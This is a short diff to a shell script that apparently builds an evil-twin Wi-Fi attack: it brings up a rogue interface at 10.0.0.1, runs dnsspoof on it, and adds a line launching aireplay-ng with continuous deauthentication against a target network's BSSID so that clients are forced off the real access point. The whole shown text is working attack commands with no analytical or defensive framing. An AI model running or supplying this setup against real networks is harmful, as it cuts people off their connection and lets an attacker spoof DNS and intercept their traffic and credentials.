@@ -34,6 +34,10 @@ sleep 2s
 sudo ifconfig at0 10.0.0.1 up
 echo "---at0 up checked---"
 
+sudo gnome-terminal --tab -t 'Deauthentication' -e "aireplay-ng --deauth 0 -a "$bssid" wlan0mon"&
+echo "---Deauthen checked---"
+
+
 sudo gnome-terminal --tab -t 'Dnsspoof' -e "sudo dnsspoof -i at0"&
 echo "---dnsspoof checked---"
 
